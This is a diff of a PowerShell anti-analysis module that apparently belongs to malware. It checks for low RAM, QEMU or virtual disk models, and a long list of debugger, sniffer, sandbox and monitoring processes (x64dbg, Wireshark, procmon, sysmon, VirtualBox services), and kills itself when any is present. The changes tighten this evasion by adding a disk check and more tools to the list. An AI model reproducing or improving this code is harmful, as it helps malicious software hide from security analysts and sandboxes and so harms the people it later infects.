@@ -1,10 +1,6 @@
 function ShowError {
-    param (
-        [string]$errorName
-    )
-
-    Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("VM/VPS/SANDBOXES ARE NOT ALLOWED ! $errorName", '', 'OK', 'Error')
-
+    param([string]$errorName)
+    Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("VM/VPS/SANDBOXES ARE NOT ALLOWED ! $errorName", '', 'OK', 'Error') | Out-Null
 }
 
 function Search-Mac {
@@ -54,7 +50,7 @@ function Invoke-ANTITOTAL {
             foreach ($item in $blacklist -split "`n") {
                 if ($data -contains $item) {
                     ShowError $item
-                    exit
+                    kill $pid -Force  
                 }
             }
         }
@@ -65,65 +61,71 @@ function ram_check {
     $ram = (Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB
     if ($ram -lt 4) {
         Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('RAM CHECK FAILED !', '', 'OK', 'Error')
-        Start-Sleep -Seconds 3
-        exit
+        kill $pid -Force  
     }
 }
 
 
-
-function VMBYPASSER {
-    ram_check        
+function VMPROTECT {
+	ram_check
+    $d = wmic diskdrive get model
+    if ($d -like "*DADY HARDDISK*" -or $d -like "*QEMU HARDDISK*") {  
+        kill $pid -Force   
+    }
     $processnames = @(
-        "autoruns",
-        "die",
-        "dumpcap",
-        "dumpcap",
-        "fakenet",
-        "fiddler",
-        "filemon",
-        "hookexplorer",
-        "httpdebugger",
-        "immunitydebugger",
-        "importrec",
-        "joeboxcontrol",
-        "joeboxserver",
-        "lordpe",
-        "ollydbg",
-        "petools",
-        "proc_analyzer",
-        "processhacker",
-        "procexp",
-        "procmon",
-        "qemu-ga",
-        "qga",
-        "resourcehacker",
-        "sandman",
-        "scylla_x64",
-        "sysanalyzer",
-        "sysinspector",
-        "sysmon",
-        "tcpview",
-        "tcpview64",
-        "tcpdump",
-        "vboxservice",
-        "vboxtray",
-        "vboxcontrol",
-        "vmacthlp",
-        "vmwareuser",
-        "vt-windows-event-stream",
-        "windbg",
-        "wireshark",
-        "x32dbg",
-        "x64dbg",
-        "xenservice"
+    "autoruns",
+    "autorunsc",
+    "die",
+    "dumpcap",
+    "fakenet",
+    "fiddler",
+    "filemon",
+    "hookexplorer",
+    "httpdebugger",
+    "idaq",
+    "idaq64",
+    "immunitydebugger",
+    "importrec",
+    "joeboxcontrol",
+    "joeboxserver",
+    "lordpe",
+    "ollydbg",
+    "petools",
+    "proc_analyzer",
+    "processhacker",
+    "procexp",
+    "procmon",
+    "qemu-ga",
+    "qga",
+    "regmon",
+    "resourcehacker",
+    "sandman",
+    "scylla_x64",
+    "sniff_hit",
+    "sysanalyzer",
+    "sysinspector",
+    "sysmon",
+    "tcpdump",
+    "tcpview",
+    "tcpview64",
+    "vboxcontrol",
+    "vboxservice",
+    "vboxtray",
+    "vmacthlp",
+    "vmwareuser",
+    "vt-windows-event-stream",
+    "windbg",
+    "wireshark",
+    "x32dbg",
+    "x64dbg",
+    "xenservice"
     )
     $detectedProcesses = Get-Process -Name $processnames -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
-
-    if ($detectedProcesses) {
-        Write-Output "Detected processes: $($detectedProcesses -join ', ')"
-        Exit 1
+    Write-Output "Detected processes: $($detectedProcesses -join ', ')"
+    if ($detectedProcesses -eq $null) {
+        Invoke-ANTITOTAL
+		Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT !" -ForegroundColor Green
     }
-    Invoke-ANTITOTAL
 }
-VMBYPASSER
+VMPROTECT
+
